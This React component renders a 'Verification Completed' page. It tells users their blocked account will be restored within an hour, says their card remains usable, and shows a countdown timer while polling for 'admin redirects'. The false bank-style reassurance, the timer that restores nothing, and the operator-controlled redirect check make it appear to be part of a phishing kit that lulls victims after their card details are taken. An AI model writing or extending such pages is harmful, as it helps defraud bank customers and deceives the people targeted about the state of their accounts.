import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { CheckCircle, Clock } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';
import { useCountdownTimer } from '@/hooks/useCountdownTimer';
import { useAdminRedirectCheck } from '@/hooks/useAdminRedirectCheck';

const ConfirmationPage = () => {
  const { formattedTime, isExpired } = useCountdownTimer(60); // 60 minutes = 1 hour
  useAdminRedirectCheck(); // Check for admin redirects

  return (
    <FormLayout 
      title="Verification Completed" 
      description="Your verification process has been successfully completed"
    >
      <ErrorAlert />
      <div className="space-y-6">
        <div className="text-center space-y-4">
          <CheckCircle className="h-16 w-16 mx-auto text-success" />
          <div>
            <h3 className="text-lg font-semibold">Thank you for completing the verification process.</h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                Your account will be restored within one hour and the block will be removed. Follow the timer shown below for real-time updates.
              </p>
              <p>
                <strong>Note:</strong> Your card and account maintain full functionality during this period and can be used normally.
              </p>
            </div>
          </div>
        </div>

        {/* Countdown Timer */}
        <div className="bg-primary/10 p-6 rounded-lg border border-primary/20 text-center">
          <div className="flex items-center justify-center gap-2 mb-2">
            <Clock className="w-5 h-5 text-primary" />
            <h4 className="font-medium text-primary">Account Restoration Timer</h4>
          </div>
          <div className="text-2xl font-mono font-bold text-primary mb-2">
            {formattedTime}
          </div>
          <p className="text-sm text-muted-foreground">
            {isExpired ? 'Your account has been restored!' : 'Time remaining until account restoration'}
          </p>
        </div>
      </div>
    </FormLayout>
  );
};

export default ConfirmationPage;